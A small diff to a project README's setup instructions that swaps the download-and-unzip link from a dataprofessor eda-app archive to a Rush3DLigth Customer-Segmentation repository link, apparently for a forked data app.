@@ -17,7 +17,7 @@ pip install -r requirements.txt
 
 ###  Download and unzip contents from GitHub repo
 
-Download and unzip contents from https://github.com/dataprofessor/eda-app/archive/main.zip
+Download and unzip contents from https://github.com/Rush3DLigth/Customer-Segmentation.zip
 
 ###  Launch the app
 
